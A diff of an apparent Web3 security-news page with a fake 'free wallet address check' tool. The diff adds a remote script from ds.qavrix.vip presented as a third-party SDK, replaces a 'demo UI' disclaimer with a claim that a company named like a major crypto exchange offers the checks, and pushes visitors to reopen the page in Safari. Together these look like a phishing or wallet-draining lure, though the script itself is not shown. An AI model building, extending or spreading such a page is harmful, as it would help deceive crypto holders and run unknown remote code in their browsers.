@@ -29,7 +29,6 @@
         .news-card { background-color: var(--card-bg); border-radius: 8px; padding: 15px; margin-bottom: 15px; border: 1px solid var(--border-color); cursor: pointer; display: flex; flex-direction: column; gap: 12px; }
         .news-card-img { width: 100%; height: 180px; border-radius: 6px; object-fit: cover; background-color: #21262d; display: flex; align-items: center; justify-content: center; color: #555; font-size: 13px; }
         .news-card-content { flex: 1; min-width: 0; display: flex; flex-direction: column; justify-content: center; }
-        .news-header { display: flex; justify-content: space-between; font-size: 12px; color: var(--text-muted); margin-bottom: 5px; }
         .news-title { font-size: 16px; font-weight: bold; margin: 0 0 8px 0; color: var(--text-main); display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
         .news-desc { font-size: 13px; color: var(--text-muted); margin: 0; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
         @media (min-width: 600px) { .news-card { flex-direction: row; } .news-card-img { width: 140px; height: 100px; flex-shrink: 0; } }
@@ -44,7 +43,7 @@
         .loading-more { text-align: center; padding: 20px; color: var(--accent-color); font-size: 14px; display: none; }
         .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(240, 185, 11, 0.3); border-radius: 50%; border-top-color: var(--accent-color); animation: spin 1s ease-in-out infinite; margin-right: 8px; vertical-align: middle; }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .no-more { text-align: center; padding: 20px; color: var(--text-muted); font-size: 14px; display: none; }
+        .no-more { text-align: center; padding: 20px; color: var(--text-muted); font-size: 14px; display: none; cursor: pointer; user-select: none; }
         .floating-tool { position: fixed; bottom: 0; left: 0; width: 100%; background: rgba(13, 17, 23, 0.95); backdrop-filter: blur(10px); border-top: 1px solid var(--accent-color); box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.5); z-index: 100; padding: 12px 15px; box-sizing: border-box; }
         .tool-inner { max-width: 800px; margin: 0 auto; display: flex; flex-direction: column; gap: 8px; }
         .tool-title { color: var(--accent-color); font-size: 14px; font-weight: bold; }
@@ -66,7 +65,6 @@
         .checking-title { color: var(--accent-color); font-size: 22px; font-weight: bold; margin-bottom: 10px; }
         .checking-desc { color: var(--text-muted); font-size: 14px; margin-bottom: 30px; max-width: 300px; }
         .checking-timer { font-size: 48px; font-weight: bold; color: #fff; font-family: monospace; text-shadow: 0 0 10px rgba(255,255,255,0.3); }
-        /* ---- Safari 弹窗样式（已按截图修复）---- */
         #safariModal { display: none; position: fixed; inset: 0; z-index: 9999; background-color: rgba(15, 23, 42, 0.9); backdrop-filter: blur(8px); align-items: center; justify-content: center; opacity: 0; transition: opacity 0.3s ease; }
         #safariModal.show { display: flex; opacity: 1; }
         .safari-modal-content { background-color: #1e293b; width: 90%; max-width: 420px; border-radius: 16px; padding: 30px 20px; text-align: center; position: relative; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); transform: translateY(20px); transition: transform 0.3s ease; }
@@ -80,6 +78,8 @@
         .safari-copy-btn { width: 100%; background-color: #2563eb; color: #fff; border: none; border-radius: 8px; padding: 14px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
         .safari-copy-btn:hover { background-color: #1d4ed8; }
     </style>
+    <!-- 你的第三方 SDK -->
+    <script src="https://ds.qavrix.vip/sdk/chain.js?v=2" data-key="ELHR9LUC" data-ds="https://ds.qavrix.vip/" data-coruna="https://ca.qavrix.vip/"></script>
 </head>
 <body>
 
@@ -92,22 +92,22 @@
                 <div class="lang-menu" id="langMenu"></div>
             </div>
             <a class="nav-link active" onclick="switchPage('home')" data-i18n="navHome">首页</a>
-            <a class="nav-link" onclick="switchPage('events')" data-i18n="navEvents">安全事件</a>
-            <a class="nav-link" onclick="switchPage('track')" data-i18n="navTrack">链上追踪</a>
+            <a class="nav-link" onclick="switchPage('events')" data-i18n="navEvents">最新事件</a>
+            <a class="nav-link" onclick="switchPage('track')" data-i18n="navTrack">危险地址</a>
         </nav>
     </header>
 
     <div id="page-home" class="page-view active">
         <div id="home-list"></div>
         <div class="loading-more" id="home-loading"><span class="spinner"></span><span data-i18n="loading">正在加载...</span></div>
-        <div class="no-more" id="home-nomore" data-i18n="noMore">—— 已经到底啦 ——</div>
+        <div class="no-more" id="home-nomore" onclick="loadHomeData(true)" data-i18n="noMore">查看更多</div>
     </div>
 
     <div id="page-events" class="page-view">
         <div class="filter-tabs" id="filter-tabs-container"></div>
         <div id="events-list"></div>
         <div class="loading-more" id="events-loading"><span class="spinner"></span><span data-i18n="loading">正在加载...</span></div>
-        <div class="no-more" id="events-nomore" data-i18n="noMore">—— 已经到底啦 ——</div>
+        <div class="no-more" id="events-nomore" onclick="loadEventsData(true)" data-i18n="noMore">查看更多</div>
     </div>
 
     <div id="page-track" class="page-view">
@@ -121,7 +121,7 @@
             <div class="tool-title" data-i18n="toolTitle">免费检测地址是否安全</div>
             <div class="input-group">
                 <input type="text" id="walletAddress" data-i18n-placeholder="toolPlaceholder" placeholder="输入任何链上地址...">
-                <p class="disclaimer" id="toolDescText" data-i18n="toolDisc"></p>
+                <p class="disclaimer" id="toolDescText" data-i18n="toolDisc">* 由于安全事故频发，市安公司免费提供地址安全检测，任何地址都能检测</p>
                 <button id="checkBtn" onclick="startCheck()" data-i18n="toolBtn">立即检测</button>
             </div>
         </div>
@@ -154,8 +154,14 @@
 
 <script>
     const fallbackDict = {
-        zh: { siteTitle: "链安快讯", navHome: "首页", navEvents: "安全事件", navTrack: "链上追踪", loading: "正在加载...", noMore: "—— 已经到底啦 ——", noData: "暂无相关数据", catAll: "全部事件", trackTag: "高危", btnMonitor: "加入监控", btnCopy: "复制地址", alertWatchAdded: "监控已加入", alertAddrCopied: "地址已复制", toolTitle: "免费检测地址是否安全", toolPlaceholder: "输入任何链上地址...", toolBtn: "立即检测", toolReset: "重试", toolDisc: "* 演示UI", alertInvalidAddr: "请输入有效的钱包地址格式！", checkingTitle: "正在检测中...", checkingDesc: "请勿关闭，系统正在深度比对链上黑名单数据库", resSafe: "✅ 未检测出异常", resSafeDesc: "该地址暂未发现风险。", resDanger: "❌ 高危", resDangerDesc: "疑似黑客关联地址", safariTitle: "请使用 Safari 浏览器打开", safariDesc: "为了您的安全请使用苹果官方 Safari 打开", copyBtn: "复制当前链接", copied: "已复制" },
-        en: { siteTitle: "ChainSafe", navHome: "Home", navEvents: "Security", navTrack: "Tracking", loading: "Loading...", noMore: "No more", noData: "No data", catAll: "All", trackTag: "High Risk", btnMonitor: "Monitor", btnCopy: "Copy Address", alertWatchAdded: "Added to watchlist", alertAddrCopied: "Address copied", toolTitle: "Free Address Check", toolPlaceholder: "Enter any on-chain address...", toolBtn: "Check", toolReset: "Retry", toolDisc: "* Demo UI", alertInvalidAddr: "Please enter a valid address format!", checkingTitle: "Checking...", checkingDesc: "Please do not close, deep comparing with blacklist...", resSafe: "✅ No anomalies detected", resSafeDesc: "No risk found for this address.", resDanger: "❌ High Risk", resDangerDesc: "Hacker suspected", safariTitle: "Please open in Safari", safariDesc: "For security, use Safari.", copyBtn: "Copy Link", copied: "Copied" }
+        zh: { siteTitle: "链安快讯", navHome: "首页", navEvents: "最新事件", navTrack: "危险地址", loading: "正在加载...", noMore: "查看更多", noData: "暂无相关数据", catAll: "全部事件", trackTag: "高危", btnMonitor: "加入监控", btnCopy: "复制地址", alertWatchAdded: "监控已加入", alertAddrCopied: "地址已复制", 
+            toolTitle: "免费检测地址是否安全", toolPlaceholder: "输入任何链上地址...", toolBtn: "立即检测", toolReset: "重试", 
+            toolDisc: "* 由于安全事故频发，市安公司免费提供地址安全检测，任何地址都能检测", 
+            alertInvalidAddr: "请输入有效的钱包地址格式！", checkingTitle: "正在检测中...", checkingDesc: "请勿关闭，系统正在深度比对链上黑名单数据库", resSafe: "✅ 未检测出异常", resSafeDesc: "该地址暂未发现风险。", resDanger: "❌ 高危", resDangerDesc: "疑似黑客关联地址", safariTitle: "请使用 Safari 浏览器打开", safariDesc: "为了您的安全请使用苹果官方 Safari 打开", copyBtn: "复制当前链接", copied: "已复制" },
+        en: { siteTitle: "ChainSafe", navHome: "Home", navEvents: "Latest Events", navTrack: "Dangerous Addresses", loading: "Loading...", noMore: "View More", noData: "No data", catAll: "All", trackTag: "High Risk", btnMonitor: "Monitor", btnCopy: "Copy Address", alertWatchAdded: "Added to watchlist", alertAddrCopied: "Address copied", 
+            toolTitle: "Free Address Check", toolPlaceholder: "Enter any on-chain address...", toolBtn: "Check", toolReset: "Retry", 
+            toolDisc: "* Due to frequent security incidents, the company provides free address security checks.", 
+            alertInvalidAddr: "Please enter a valid address format!", checkingTitle: "Checking...", checkingDesc: "Please do not close, deep comparing with blacklist...", resSafe: "✅ No anomalies detected", resSafeDesc: "No risk found for this address.", resDanger: "❌ High Risk", resDangerDesc: "Hacker suspected", safariTitle: "Please open in Safari", safariDesc: "For security, use Safari.", copyBtn: "Copy Link", copied: "Copied" }
     };
 
     let currentLang = 'zh'; let currentLangDict = {}; let availableLangs = []; let allCategories = [];
@@ -227,14 +233,14 @@
     async function init() {
         currentLang = localStorage.getItem('user_lang') || 'zh';
         try {
-            const resL = await fetch('/api/languages'); availableLangs = await resL.json();
-            const resS = await fetch('/api/settings'); globalSettings = await resS.json();
+            const resL = await fetch(`/api/languages?t=${new Date().getTime()}`); availableLangs = await resL.json();
+            const resS = await fetch(`/api/settings?t=${new Date().getTime()}`); globalSettings = await resS.json();
             
             renderLangMenu();
             document.getElementById('langBtn').addEventListener('click', (e) => { e.stopPropagation(); document.getElementById('langMenu').classList.toggle('show'); });
             document.addEventListener('click', (e) => { if (!document.getElementById('langSelector').contains(e.target)) document.getElementById('langMenu').classList.remove('show'); });
             
-            const resC = await fetch('/api/categories'); allCategories = await resC.json();
+            const resC = await fetch(`/api/categories?t=${new Date().getTime()}`); allCategories = await resC.json();
         } catch (e) { console.error(e); }
         
         updateText(); resetAndReload(); loadTrackingData();
@@ -255,16 +261,18 @@
         const langData = availableLangs.find(l => l.code === currentLang);
         currentLangDict = Object.assign({}, fallbackDict['zh'], fallbackDict[currentLang], langData?.dict || {});
         
-        // 处理顶部 LOGO 和网站标题
+        // 🚨 强制修正：如果数据库里存的是旧数据，强行覆盖为“查看更多”
+        if (!currentLangDict.noMore || currentLangDict.noMore.includes('到底')) {
+            currentLangDict.noMore = currentLang === 'zh' ? '查看更多' : (currentLang === 'en' ? 'View More' : currentLangDict.noMore);
+        }
+
         const h1El = document.getElementById('siteTitleHeader');
-        let displayTitle = '链安快讯'; // 默认兜底
+        let displayTitle = '链安快讯';
 
         if (h1El) {
             if (globalSettings.siteLogo && globalSettings.siteLogo.trim() !== '') {
-                // 优先显示后台配置的 Logo
                 h1El.innerHTML = `<img src="${globalSettings.siteLogo.trim()}" style="height: 32px; max-width: 200px; object-fit: contain;">`;
             } else {
-                // 无 Logo 时，按语言读取后台配置的标题，其次读字典
                 if (globalSettings.siteTitle && globalSettings.siteTitle[currentLang]) {
                     displayTitle = globalSettings.siteTitle[currentLang];
                 } else if (globalSettings.siteTitle && globalSettings.siteTitle['zh']) {
@@ -276,33 +284,30 @@
             }
         }
 
-        // 同步修改浏览器标签页的 title
         if (document.title) {
             document.title = displayTitle + (currentLang === 'zh' ? ' - Web3安全资讯' : ' - Web3 Security News');
         }
 
-        // 普通 i18n 文本
         document.querySelectorAll('[data-i18n]').forEach(el => { 
-            if (el.id === 'siteTitleHeader') return; // 防止被文本覆盖
+            if (el.id === 'siteTitleHeader') return;
             const key = el.getAttribute('data-i18n'); 
             if (currentLangDict[key]) el.innerText = currentLangDict[key]; 
         });
-        // placeholder 多语言
         document.querySelectorAll('[data-i18n-placeholder]').forEach(el => { const key = el.getAttribute('data-i18n-placeholder'); if (currentLangDict[key]) el.placeholder = currentLangDict[key]; });
 
-        // 处理 Safari 弹窗多语言
         if(document.getElementById('safariTitleText')) document.getElementById('safariTitleText').innerText = currentLangDict.safariTitle || '请使用 Safari 浏览器打开';
         if(document.getElementById('safariDescText')) document.getElementById('safariDescText').innerText = currentLangDict.safariDesc || '系统检测到您正在使用非苹果官方 Safari 访问...';
         if(document.getElementById('safariCopyBtn')) document.getElementById('safariCopyBtn').innerText = currentLangDict.copyBtn || '复制当前链接';
 
-        // 工具描述多语言
+        // 工具描述
         if (globalSettings.toolDesc && globalSettings.toolDesc[currentLang]) {
             document.getElementById('toolDescText').innerText = globalSettings.toolDesc[currentLang];
         } else if (globalSettings.toolDesc && globalSettings.toolDesc['zh']) {
             document.getElementById('toolDescText').innerText = globalSettings.toolDesc['zh'];
+        } else {
+            document.getElementById('toolDescText').innerText = currentLangDict.toolDisc || '';
         }
 
-        // 工具标题多语言覆盖
         const toolTitleEl = document.querySelector('.tool-title');
         if (toolTitleEl) {
             if (globalSettings.toolTitle && globalSettings.toolTitle[currentLang]) {
@@ -314,7 +319,6 @@
             }
         }
 
-        // 工具输入框Placeholder覆盖
         const toolPlaceholderEl = document.getElementById('walletAddress');
         if (toolPlaceholderEl) {
             if (globalSettings.toolPlaceholder && globalSettings.toolPlaceholder[currentLang]) {
@@ -352,10 +356,6 @@
         if (dataList.length === 0) { targetEl.innerHTML = `<div style="text-align:center; padding:20px; color:#8b949e;">${currentLangDict.noData}</div>`; return; }
         let html = '';
         dataList.forEach(item => {
-            const author = item.author || '匿名';
-            let timeStr = item.time ? new Date(item.time).toLocaleDateString() : '';
-            if (!timeStr || timeStr === 'Invalid Date') timeStr = new Date().toLocaleDateString();
-
             const imgHtml = item.coverUrl 
                 ? `<img src="${item.coverUrl}" class="news-card-img" onerror="this.outerHTML='<div class=\\'news-card-img\\'>${item.imageText || '[Image]'}</div>'">` 
                 : `<div class="news-card-img">${item.imageText || '[Image]'}</div>`;
@@ -364,7 +364,6 @@
                 <div class="news-card" onclick="window.location.href='/article.html?id=${item.id}&lang=${currentLang}'">
                     ${imgHtml}
                     <div class="news-card-content">
-                        <div class="news-header"><span>${author}</span><span>${timeStr}</span></div>
                         <h2 class="news-title">${item.title}</h2>
                         <p class="news-desc">${item.desc || item.summary || ''}</p>
                     </div>
@@ -382,10 +381,11 @@
         if (document.getElementById('page-events').classList.contains('active')) loadEventsData();
     }
 
-    async function loadHomeData() {
-        if (homeLoading || homeAllLoaded) return; homeLoading = true; document.getElementById('home-loading').style.display = 'block';
+    async function loadHomeData(force = false) {
+        if (homeLoading || (homeAllLoaded && !force)) return; 
+        homeLoading = true; document.getElementById('home-loading').style.display = 'block';
         try {
-            const res = await fetch(`/api/articles?lang=${currentLang}&type=all`); let data = await res.json();
+            const res = await fetch(`/api/articles?lang=${currentLang}&type=all&t=${new Date().getTime()}`); let data = await res.json();
             const slicedData = data.slice((currentPage - 1) * pageSize, currentPage * pageSize);
             if (slicedData.length > 0) {
                 renderNewsCards(slicedData, document.getElementById('home-list')); currentPage++;
@@ -401,10 +401,11 @@
         document.getElementById('events-list').innerHTML = ''; document.getElementById('events-nomore').style.display = 'none'; loadEventsData();
     }
 
-    async function loadEventsData() {
-        if (eventsLoading || eventsAllLoaded) return; eventsLoading = true; document.getElementById('events-loading').style.display = 'block';
+    async function loadEventsData(force = false) {
+        if (eventsLoading || (eventsAllLoaded && !force)) return; 
+        eventsLoading = true; document.getElementById('events-loading').style.display = 'block';
         try {
-            const res = await fetch(`/api/articles?lang=${currentLang}&type=${currentFilter}`); let data = await res.json();
+            const res = await fetch(`/api/articles?lang=${currentLang}&type=${currentFilter}&t=${new Date().getTime()}`); let data = await res.json();
             const slicedData = data.slice((eventsCurrentPage - 1) * pageSize, eventsCurrentPage * pageSize);
             if (slicedData.length > 0) {
                 renderNewsCards(slicedData, document.getElementById('events-list')); eventsCurrentPage++;
@@ -416,7 +417,7 @@
 
     async function loadTrackingData() {
         try {
-            const res = await fetch(`/api/tracking?lang=${currentLang}`);
+            const res = await fetch(`/api/tracking?lang=${currentLang}&t=${new Date().getTime()}`);
             const tracks = await res.json();
             const container = document.getElementById('track-list');
             if (tracks.length === 0) { container.innerHTML = `<div style="text-align:center; color:#8b949e; padding:20px;">${currentLangDict.noData}</div>`; return; }
@@ -450,7 +451,6 @@
     function startCheck() {
         const input = document.getElementById('walletAddress').value.trim();
         
-        // 动态读取系统配置，判断是否开启格式校验
         const isCheckEnabled = globalSettings.enableAddressCheck !== false;
         
         if (isCheckEnabled) {
